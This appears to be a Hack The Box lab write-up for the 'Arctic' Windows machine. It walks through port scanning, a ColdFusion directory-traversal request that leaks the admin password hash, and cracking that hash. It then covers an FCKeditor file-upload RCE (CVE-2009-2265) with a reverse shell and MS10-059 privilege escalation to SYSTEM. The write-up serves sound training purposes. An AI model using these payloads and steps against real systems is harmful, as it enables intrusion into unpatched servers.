
### Index
1. Locating nmap NSE script 
2. Enumerating RPC
3. Adobe Cold Fusion FCKEditor File upload vulnerability. [CVE-2009-2265](https://www.exploit-db.com/exploits/50057)
4. Upgrading the NetCat Shell (Gained by executing the python exploit) to Meterpreter shell and then running local exploit suggester.
5. MS10-059: Chimichurri was used for Priv Esc.



Initial Enumeration (subdomain, vhosts, directories/files)

```
$ nmap -T4 --min-rate=1000 -p- -sC -sV -Pn 10.10.10.11 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 00:49 EDT
Nmap scan report for arctic.htb (10.10.10.11)

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Just because port 135 is open. Trying out RPC Enum
```
$ locate -r nse$ | grep msrpc  
/usr/share/nmap/scripts/msrpc-enum.nse

$ sudo nmap -p135 --script=msrpc-enum -sS -sC -sV 10.10.10.11
PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC
```

Upon access the site on port 8500, the CVE-2010-2861 Directory Traversal Vulnerability was present. I read the [PoC ](https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2010-2861/README.md) and found the backend admin password.
```
Request:
GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1
Host: arctic.htb:8500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: CFID=200; CFTOKEN=84509656
Upgrade-Insecure-Requests: 1

Response:
<title>#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true</title>
```

using auxiliary/scanner/http/coldfusion_locale_traversal in msf
```

```

Trying to identify the hash as well
```
$>$hashid 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
Analyzing '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 

```

Cracking the above hash and got the admin password for Adobe Coldfusion
```
$ hashcat -m 100 -a 0 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 /usr/share/wordlists/rockyou.txt
2f635f6d20e3fde0c53075a84b68fb07dcec9b03:happyday  
```

After digging into Admin Panel, I did not find any place to host my reverse Shell. I was able to create archives, backups, connectors but nothing was helping me to host my shell. Under the system settings in Admin panel, i notice that the user 'tolis' is mention and the adobe cold fusion is deployed as user 'tolis'. I googled ColdFusion RCE and found this [Exploit-DB](https://www.exploit-db.com/exploits/50057) exploit which is CVE-2009-2265. The vulnerability exist in FCKeditor and the path to upload files is unrestricted. However, I was not able to locate where is the FCKeditor from the Admin panel. I have the exploit. Felt like I'm just a noob that don't know what the exploit is doing. But Reading the [GitHub Repo](https://github.com/0xConstant/CVE-2009-2265 ) make little bit things clear in my brain. 

After reading [This Article](https://codewatch.org/2013/12/07/manually-penetrating-the-fckedit-vulnerability-cve-2009-2265/) Things were little bit clear that during my earlier enumeration, I forgot to take a look at the following path when I open http://arctic.htb:8500/ 
```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/
```

Now the Exploit-DB exploit that I have used earlier, make sense that my JSP shell is being uploaded to the following location.
```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00
```

I have the path present on my target and I use the exploit to capture the Tolis user flag. 

# Shell Upgrading Notes

My python exploit code has the following line. 
```
os.system(f'nc -nlvp {lport}')
```

I comment out the above line in the python exploit and use the following msf module to start the netcat listener so that I can capture the meterpreter shell instead of the netcat shell.
```
msf>use exploit/multi/handler
msf>set LHOST 10.10.16.5
msf>set LPORT 4444
msf>run
[*] Started reverse TCP handler on 10.10.16.5:4444 

[*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.11:55411) at 2024-08-06 00:15:27 -0400

Now use CTRL+Z to throw the shell in the background and use 'local_exploit_suggester'. For this machine it was not helpful. Still i tried.
```

# Privilege Escalation 

### Initial Enum using winPEAS.bat

UAC is Enabled. but according to HackTricks, I need a GUI access
```
 [+] UAC Settings                                                                                                                                                       
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on                                                                            
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access           
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                            
    EnableLUA    REG_DWORD    0x1
```

I tried mimikatz.exe and I did not have any good luck there. Reading the Machine Info on Hack The Box, i notice that it was mention that "privilege escalation is achieved using the MS10-059 exploit. " [This Exploit](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled) was used to obtained the Administrator Shell and root flag.

```
$ nc -lvnp 8000                                                                      
listening on [any] 8000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.11] 55575
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Documents>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>more root.txt
more root.txt
fcb***********************
```

